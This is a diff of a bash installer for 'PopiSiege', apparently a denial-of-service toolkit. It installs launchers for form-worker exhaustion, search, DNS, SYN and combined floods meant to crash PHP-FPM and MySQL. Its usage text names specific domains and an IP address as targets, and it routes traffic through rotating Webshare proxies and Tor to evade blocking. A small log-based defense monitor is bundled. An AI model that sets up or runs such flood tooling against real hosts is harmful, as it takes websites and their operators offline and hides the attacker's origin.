@@ -5,232 +5,101 @@
 set -e
 
 INSTALL_DIR="/opt/popisiege"
-BIN_POPI="/usr/local/bin/popisiege"
-BIN_SEARCH="/usr/local/bin/search-flood"
-BIN_GET="/usr/local/bin/get-burst"
-BIN_VPS="/usr/local/bin/vps-burst"
-BIN_WATCH="/usr/local/bin/popiwatch"
-BIN_CF="/usr/local/bin/popicf"
-BIN_T1="/usr/local/bin/popitest1"
-BIN_SYN="/usr/local/bin/syntest"
-BIN_HOME="/usr/local/bin/popihome"
-BIN_XMLRPC="/usr/local/bin/xmlrpc-burst"
-BIN_UPLOAD="/usr/local/bin/upload-burst"
-BIN_COMBO="/usr/local/bin/combo-flood"
-BIN_DNS_UDP="/usr/local/bin/dns-flood"
-BIN_DNS_TCP="/usr/local/bin/dns-tcp-flood"
 BACKBONE_CREDS="$INSTALL_DIR/proxies_webshare_backbone_creds.txt"
 
+G="\033[0;32m"; R="\033[0;31m"; Y="\033[0;33m"; W="\033[0m"; B="\033[1m"
+
 echo ""
-echo "=============================="
-echo "  PopiSiege Installer"
-echo "=============================="
+echo -e "${B}=============================="
+echo    "  PopiSiege Installer"
+echo -e "==============================${W}"
 echo ""
 
-# clone or update
+# ── clone or update ────────────────────────────────────────────────────────────
 if [ -d "$INSTALL_DIR/.git" ]; then
-    echo "[*] Updating existing install..."
-    git -C "$INSTALL_DIR" pull
+    echo -e "${G}[*]${W} Updating existing install..."
+    git -C "$INSTALL_DIR" pull -q
 else
-    echo "[*] Cloning PopiSiege..."
-    git clone https://github.com/orospor/PopiSiege.git "$INSTALL_DIR"
+    echo -e "${G}[*]${W} Cloning PopiSiege..."
+    git clone -q https://github.com/orospor/PopiSiege.git "$INSTALL_DIR"
 fi
 
-# install tor
-echo "[*] Installing Tor..."
-apt-get update -qq
-apt-get install -y tor
-if ! grep -q "^ControlPort" /etc/tor/torrc; then
-    printf '\nControlPort 9051\nCookieAuthentication 0\n' >> /etc/tor/torrc
-fi
-systemctl restart tor
-sleep 2
-touch "$INSTALL_DIR/use_tor"
-
-# install python deps
-echo "[*] Installing Python dependencies..."
-apt-get install -y -q python3-pip python3-dev
+# ── python deps ────────────────────────────────────────────────────────────────
+echo -e "${G}[*]${W} Installing Python dependencies..."
+apt-get install -y -q python3-pip python3-dev 2>/dev/null || true
 pip3 install -r "$INSTALL_DIR/requirements.txt" -q --break-system-packages 2>/dev/null \
     || pip3 install -r "$INSTALL_DIR/requirements.txt" -q
 
-# create global launchers
-echo "[*] Creating global commands..."
-
-cat > "$BIN_POPI" << EOF
-#!/usr/bin/env bash
-sudo PROXY_USER="\$PROXY_USER" PROXY_PASS="\$PROXY_PASS" python3 /opt/popisiege/popisiege.py "\$@"
-EOF
-chmod +x "$BIN_POPI"
-
-cat > "$BIN_SEARCH" << EOF
-#!/usr/bin/env bash
-python3 /opt/popisiege/search_flood.py "\$@"
-EOF
-chmod +x "$BIN_SEARCH"
-
-cat > "$BIN_GET" << EOF
-#!/usr/bin/env bash
-sudo PROXY_USER="\$PROXY_USER" PROXY_PASS="\$PROXY_PASS" python3 /opt/popisiege/get_burst.py "\$@"
-EOF
-chmod +x "$BIN_GET"
-
-cat > "$BIN_VPS" << EOF
-#!/usr/bin/env bash
-python3 /opt/popisiege/vps_burst.py "\$@"
-EOF
-chmod +x "$BIN_VPS"
-
-cat > "$BIN_WATCH" << EOF
-#!/usr/bin/env bash
-python3 /opt/popisiege/popiwatch.py "\$@"
-EOF
-chmod +x "$BIN_WATCH"
-
-# popicf — one-word launcher for the Webshare backbone-connection setup.
-# The creds file is deliberately NOT embedded in this script (it would land
-# in git otherwise) — it must already exist at $BACKBONE_CREDS, created once
-# per machine from your Webshare backbone proxy list export.
-cat > "$BIN_CF" << EOF
-#!/usr/bin/env bash
-CREDS="$BACKBONE_CREDS"
-if [ ! -s "\$CREDS" ]; then
-    echo "Missing or empty \$CREDS"
-    echo "Create it once with your Webshare backbone list (p.webshare.io:80:user-N:pass per line), then rerun."
-    exit 1
+# ── webshare creds ─────────────────────────────────────────────────────────────
+echo ""
+if [ -s "$BACKBONE_CREDS" ]; then
+    echo -e "${G}[*]${W} Webshare creds already exist — skipping."
+else
+    echo -e "${Y}[?]${W} Enter Webshare rotating proxy username (blank to skip):"
+    read -r WS_USER
+    if [ -n "$WS_USER" ]; then
+        echo -e "${Y}[?]${W} Enter Webshare proxy password:"
+        read -r WS_PASS
+        printf "%s\n%s\n" "$WS_USER" "$WS_PASS" > "$BACKBONE_CREDS"
+        chmod 600 "$BACKBONE_CREDS"
+        echo -e "${G}[✓]${W} Creds saved to $BACKBONE_CREDS"
+    else
+        echo -e "${Y}[!]${W} Skipped — create $BACKBONE_CREDS manually later."
+    fi
 fi
-sudo python3 /opt/popisiege/popisiege.py --concurrency 19 --verbose --proxy-file "\$CREDS" "\$@"
-EOF
-chmod +x "$BIN_CF"
 
-# popitest1 — baseline control: no IP rotation (this machine's own IP), no
-# UA rotation (one fixed profile). Cleanest run to diff against a rotating one.
-cat > "$BIN_T1" << EOF
-#!/usr/bin/env bash
-python3 /opt/popisiege/popitest1.py "\$@"
-EOF
-chmod +x "$BIN_T1"
+# ── global commands ────────────────────────────────────────────────────────────
+echo -e "${G}[*]${W} Creating global commands..."
 
-cat > "$BIN_SYN" << EOF
-#!/usr/bin/env bash
-sudo python3 /opt/popisiege/syntest.py "\$@"
-EOF
-chmod +x "$BIN_SYN"
+_make_cmd() {
+    local bin="$1"; shift
+    printf '#!/usr/bin/env bash\n%s\n' "$*" > "$bin"
+    chmod +x "$bin"
+}
 
-# popihome — one-word launcher for homepage-GET flood mode: same Webshare
-# backbone connection, concurrency, and profile rotation as popicf, but hits
-# the domain's homepage instead of POSTing to the CF7 feedback endpoint.
-cat > "$BIN_HOME" << EOF
-#!/usr/bin/env bash
-CREDS="$BACKBONE_CREDS"
-if [ ! -s "\$CREDS" ]; then
-    echo "Missing or empty \$CREDS"
-    echo "Create it once with your Webshare backbone list (p.webshare.io:80:user-N:pass per line), then rerun."
-    exit 1
+_make_cmd /usr/local/bin/popisiege \
+    "exec python3 /opt/popisiege/popisiege.py \"\$@\""
+
+_make_cmd /usr/local/bin/popibundmara \
+    "exec python3 /opt/popisiege/popisiege.py \"\$@\""
+
+_make_cmd /usr/local/bin/search-flood \
+    "exec python3 /opt/popisiege/search_flood.py \"\$@\""
+
+_make_cmd /usr/local/bin/popiwatch \
+    "exec python3 /opt/popisiege/popiwatch.py \"\$@\""
+
+_make_cmd /usr/local/bin/dns-flood \
+    "cd /opt/popisiege && exec python3 dns_flood.py \"\$@\""
+
+_make_cmd /usr/local/bin/dns-tcp-flood \
+    "cd /opt/popisiege && exec python3 dns_tcp_flood.py \"\$@\""
+
+# ── done ───────────────────────────────────────────────────────────────────────
+echo ""
+echo -e "${B}=============================="
+echo    "  Done."
+echo -e "==============================${W}"
+echo ""
+echo -e "  ${B}CF7 Worker Exhaustion:${W}"
+echo    "    popibundmara --verbose"
+echo    "    popibundmara --target metoo-buffalo.com"
+echo    "    popibundmara --concurrency 30 --verbose"
+echo ""
+echo -e "  ${B}Search Flood (PHP + MySQL):${W}"
+echo    "    search-flood --verbose"
+echo    "    search-flood --target metoo-buffalo.com --concurrency 80"
+echo ""
+echo -e "  ${B}DNS Flood:${W}"
+echo    "    dns-flood  --target <IP> --workers 300"
+echo    "    dns-tcp-flood --target <IP> --workers 300"
+echo ""
+echo -e "  ${B}Defense monitor:${W}"
+echo    "    popiwatch --log /var/log/nginx/access.log"
+echo    "    sudo popiwatch --log /path/to/access.log --live"
+echo ""
+if [ ! -s "$BACKBONE_CREDS" ]; then
+    echo -e "  ${Y}[!]${W} Webshare creds missing — create before running:"
+    echo    "      printf 'USERNAME\\nPASSWORD\\n' > $BACKBONE_CREDS"
+    echo ""
 fi
-sudo python3 /opt/popisiege/popisiege.py --concurrency 19 --verbose --proxy-file "\$CREDS" --homepage "\$@"
-EOF
-chmod +x "$BIN_HOME"
-
-cat > "$BIN_XMLRPC" << EOF
-#!/usr/bin/env bash
-cd /opt/popisiege
-exec python3 xmlrpc_burst.py "\$@"
-EOF
-chmod +x "$BIN_XMLRPC"
-
-cat > "$BIN_UPLOAD" << EOF
-#!/usr/bin/env bash
-cd /opt/popisiege
-exec python3 upload_flood.py "\$@"
-EOF
-chmod +x "$BIN_UPLOAD"
-
-cat > "$BIN_COMBO" << EOF
-#!/usr/bin/env bash
-cd /opt/popisiege
-exec python3 combo_flood.py "\$@"
-EOF
-chmod +x "$BIN_COMBO"
-
-cat > "$BIN_DNS_UDP" << EOF
-#!/usr/bin/env bash
-cd /opt/popisiege
-exec python3 dns_flood.py "\$@"
-EOF
-chmod +x "$BIN_DNS_UDP"
-
-cat > "$BIN_DNS_TCP" << EOF
-#!/usr/bin/env bash
-cd /opt/popisiege
-exec python3 dns_tcp_flood.py "\$@"
-EOF
-chmod +x "$BIN_DNS_TCP"
-
-echo ""
-echo "=============================="
-echo "  Done."
-echo "=============================="
-echo ""
-echo "  CF7 Worker Exhaustion:"
-echo "    popisiege"
-echo "    popisiege --target metoo-buffalo.com"
-echo "    popisiege --concurrency 30"
-echo ""
-echo "  Search Flood (PHP + MySQL):"
-echo "    search-flood"
-echo "    search-flood --target metoo-buffalo.com"
-echo "    search-flood --concurrency 80"
-echo ""
-echo "  REST API POST Burst:"
-echo "    vps-burst"
-echo ""
-echo "  REST API GET Flood:"
-echo "    get-burst"
-echo ""
-echo "  Origin-level defense (Cloudflare-independent, dry-run by default):"
-echo "    popiwatch --log /path/to/access.log"
-echo "    sudo popiwatch --log /path/to/access.log --live    # actually blocks via iptables"
-echo ""
-echo "  Webshare backbone connection, one-word launcher:"
-echo "    popicf"
-echo "    (needs $BACKBONE_CREDS to exist first — create it once from your"
-echo "     Webshare backbone proxy list export, gitignored, never committed)"
-echo ""
-echo "  Homepage GET flood (same backbone/concurrency as popicf, GET / instead"
-echo "  of POST to CF7 feedback):"
-echo "    popihome"
-echo "    popihome --target metoo-buffalo.com"
-echo "    (needs $BACKBONE_CREDS, same as popicf)"
-echo ""
-echo "  Baseline control — no IP rotation, no UA rotation:"
-echo "    popitest1"
-echo "    popitest1 --concurrency 10 --verbose"
-echo "    popitest1 --profile firefox147   # hold a different single profile fixed"
-echo ""
-echo "  Combo Flood — PHP-FPM OOM + MySQL crash simultaneously (Tor):"
-echo "    combo-flood --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50"
-echo "    combo-flood --origin <IP> --host metoo-buffalo.com --form-id 248"
-echo "    combo-flood --upload-workers 20 --search-workers 40 --size 7"
-echo ""
-echo "  SYN flood + service degradation monitor:"
-echo "    syntest --target <IP> --port 22 --rate 1000 --duration 30"
-echo "    syntest --target <IP> --port 22,80,443 --http-probe https://example.com/"
-echo "    (logs saved to logs/ directory automatically)"
-echo ""
-echo "  DNS Open Resolver Flood:
-    dns-flood --target 104.236.68.226 --workers 300
-    dns-tcp-flood --target 104.236.68.226 --workers 300
-    dns-tcp-flood --target 104.236.68.226 --workers 300 --tor
-
-  All tools:"
-echo "    --verbose        show every request"
-echo "    --delay 1        pause between bursts"
-echo "    --proxy-file     custom proxy list"
-echo ""
-echo "  Authenticated proxies (Webshare, etc.):"
-echo "    export PROXY_USER=youruser"
-echo "    export PROXY_PASS=yourpass"
-echo "    popisiege --proxy-file proxies_webshare.txt"
-echo "    (proxies_webshare.txt holds host:port only — creds come from env vars,"
-echo "     never store them in a file that gets committed to git)"
-echo ""
